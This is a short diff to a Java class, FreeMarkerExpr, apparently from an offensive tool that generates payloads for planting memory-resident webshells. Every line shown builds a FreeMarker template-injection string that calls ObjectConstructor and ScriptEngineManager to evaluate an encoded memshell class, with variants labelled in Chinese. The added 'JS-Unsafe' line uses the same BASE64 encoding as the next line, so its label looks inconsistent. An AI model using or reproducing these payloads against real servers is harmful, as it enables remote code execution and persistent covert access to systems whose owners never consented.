@@ -47,6 +47,7 @@ public class FreeMarkerExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
+                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
                     "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER) + "\")}") + System.lineSeparator() + " <==",
                     "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL) + "\")}") + System.lineSeparator() + " <==",
